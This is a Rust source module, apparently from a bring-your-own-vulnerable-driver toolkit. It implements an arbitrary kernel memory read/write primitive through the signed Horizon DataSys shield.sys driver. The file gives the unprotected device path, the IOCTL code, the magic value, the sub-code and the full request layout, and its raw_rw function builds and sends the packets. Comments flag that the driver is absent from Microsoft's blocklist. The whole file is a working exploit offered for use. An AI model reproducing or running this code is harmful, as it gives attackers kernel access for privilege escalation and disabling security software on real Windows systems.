//! shield.sys — Horizon DataSys RollBack Rx / Reboot Restore (LOLDrivers #344).
//!
//! **Status: NOT blocklisted** as of July 2026. EV-signed by DigiCert
//! (New Horizon Datasys Inc). Three variants share this codebase:
//!   - shield.sys
//!   - shield-async.sys
//!   - shieldwp.sys
//! Only one loads at a time (service config selects the variant); all create
//! `\Device\EAZShield`.
//!
//! ## Protocol (verified against magicsword-io/LOLDrivers issue #344)
//!
//! The device is created with plain `IoCreateDevice` (no SDDL, no
//! `FILE_DEVICE_SECURE_OPEN`, `Exclusive=FALSE`) and `IRP_MJ_CREATE` returns
//! `STATUS_SUCCESS` with no access check.
//!
//! A SINGLE bidirectional IOCTL drives the arbitrary-kernel-memcpy primitive:
//!   - **IOCTL `0x96102014`** (METHOD_BUFFERED, FILE_ANY_ACCESS), sub-code
//!     `0xf0016`. The same code does read AND write — a direction byte selects
//!     which. The driver passes a user-supplied 64-bit pointer straight to
//!     `memcpy` with NO `ProbeForRead`/`ProbeForWrite` (`MmIsAddressValid` is
//!     the only gate, which MSDN documents is NOT a security check).
//!
//! Request struct (METHOD_BUFFERED input buffer):
//! ```text
//!   offset  field      type   notes
//!   0x00    header     u32    (unused by this sub-code)
//!   0x04    magic      u32    'wCMD' = 0x444D4377
//!   0x08    sub-code   u32    0xf0016 = arbitrary kernel memcpy
//!   0x40    direction  u8     0 = read (kernel → user), 1 = write (user → kernel)
//!   0x44    length     u32    byte count (no bounds check)
//!   0x48    kaddr      u64    target kernel virtual address (memcpy operand)
//! ```
//!
//! Read data is returned in the METHOD_BUFFERED output buffer; for a write the
//! input buffer carries the payload after the fixed header (the driver memcpys
//! from it to `kaddr`). The buffer is sized to `HEADER_LEN + length` so the
//! payload/output region has room for the full transfer.
//!
//! Source: github.com/magicsword-io/LOLDrivers/issues/344

use crate::byovd::{DeviceIoControlFn, RwOp, VulnDriverIoctl};
use core::ffi::c_void;
use core::ptr;

pub struct Shield;

/// The single bidirectional IOCTL (read + write share it).
const SHIELD_IOCTL: u32 = 0x96102014;
/// Magic `'wCMD'` little-endian (0x77='w', 0x43='C', 0x4D='M', 0x44='D').
const SHIELD_MAGIC: u32 = 0x444D4377;
/// Sub-code for the arbitrary kernel memcpy primitive.
const SHIELD_SUBCODE_RW: u32 = 0xf0016;
/// Fixed request header length (fields up to the payload region).
const SHIELD_HEADER_LEN: usize = 0x50;

impl VulnDriverIoctl for Shield {
    fn device_path(&self) -> &[u16] {
        // \\.\EAZShield — device created by the driver with no security descriptor.
        static PATH: [u16; 13] = [
            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
            'E' as u16, 'A' as u16, 'Z' as u16, 'S' as u16,
            'h' as u16, 'i' as u16, 'e' as u16, 'l' as u16,
            'd' as u16,
        ];
        &PATH
    }

    // Same IOCTL for both directions (direction byte in the request selects).
    fn read_ioctl(&self) -> u32 { SHIELD_IOCTL }
    fn write_ioctl(&self) -> u32 { SHIELD_IOCTL }

    // Not used by the raw_rw override (named fields, not a fixed offset), but
    // returned for trait introspection consistency.
    fn addr_offset(&self) -> usize { 0x48 }

    fn blocklist_status(&self) -> &'static str {
        "CLEAN: not on Microsoft Vulnerable Driver Blocklist as of July 2026 (LOLDrivers #344)"
    }

    /// Shield's protocol is a single bidirectional IOCTL: one DeviceIoControl
    /// transfers the whole buffer (no per-byte loop). Read = kernel→user
    /// (result in output buffer), Write = user→kernel (payload in input buffer).
    ///
    /// The driver takes a raw kernel pointer in the request and memcpys
    /// `length` bytes — no validation. The transfer is atomic from the caller's
    /// perspective: either all `buf.len()` bytes move or none do (partial
    /// failure surfaces as `Err(0)` → `KrwError::Partial { ok: 0 }`).
    unsafe fn raw_rw(
        &self,
        op: RwOp,
        kaddr: u64,
        buf: &mut [u8],
        device: *mut c_void,
        dioctl: DeviceIoControlFn,
    ) -> Result<(), usize> {
        let total = SHIELD_HEADER_LEN.checked_add(buf.len()).expect("shield buf overflow");
        let mut packet: alloc::vec::Vec<u8> = alloc::vec![0u8; total];

        // Header (see struct doc above).
        packet[0x04..0x08].copy_from_slice(&SHIELD_MAGIC.to_le_bytes());
        packet[0x08..0x0C].copy_from_slice(&SHIELD_SUBCODE_RW.to_le_bytes());
        // direction @ 0x40: 0 = read (kernel → user), 1 = write (user → kernel)
        packet[0x40] = match op {
            RwOp::Read => 0,
            RwOp::Write => 1,
        };
        packet[0x44..0x48].copy_from_slice(&(buf.len() as u32).to_le_bytes());
        packet[0x48..0x50].copy_from_slice(&kaddr.to_le_bytes());

        // For a write, the payload rides in the input buffer right after the
        // header. For a read the payload region is the output landing pad; it
        // is left zeroed here and filled by the driver.
        if matches!(op, RwOp::Write) {
            packet[SHIELD_HEADER_LEN..SHIELD_HEADER_LEN + buf.len()]
                .copy_from_slice(buf);
        }

        let mut ret: u32 = 0;
        // METHOD_BUFFERED: the I/O manager allocates a single system buffer;
        // input is copied in, output is copied back out to `packet` on return.
        // Pass the whole packet as BOTH in- and out-buffer so a read result is
        // written back into the payload region we then copy to `buf`.
        let ok = unsafe {
            dioctl(
                device,
                SHIELD_IOCTL,
                packet.as_ptr() as *const c_void,
                packet.len() as u32,
                packet.as_mut_ptr() as *mut c_void,
                packet.len() as u32,
                &mut ret,
                ptr::null_mut(),
            )
        };
        if ok == 0 {
            return Err(0);
        }
        if matches!(op, RwOp::Read) {
            // Driver wrote `buf.len()` bytes into the payload region.
            buf.copy_from_slice(&packet[SHIELD_HEADER_LEN..SHIELD_HEADER_LEN + buf.len()]);
        }
        Ok(())
    }
}
